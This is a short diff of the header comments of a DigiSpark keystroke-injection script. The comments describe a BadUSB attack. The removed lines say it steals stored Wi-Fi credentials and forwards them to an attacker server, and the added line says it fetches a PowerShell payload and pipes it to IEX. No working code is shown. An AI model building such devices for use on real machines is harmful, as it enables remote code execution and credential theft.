@@ -1,5 +1,4 @@
-//This script grabs all stored wireless network credentials and forwards them via http(s) 
-//to an attacker controlled server (created to work best with Synergy-Httpx as the receiver).  
+//This script requests a PowerShell payload from an http(s) server pipes it to IEX 
 //I edited a template from https://github.com/CedArctic/DigiSpark-Scripts/ to make this.
 
 #include "DigiKeyboard.h"
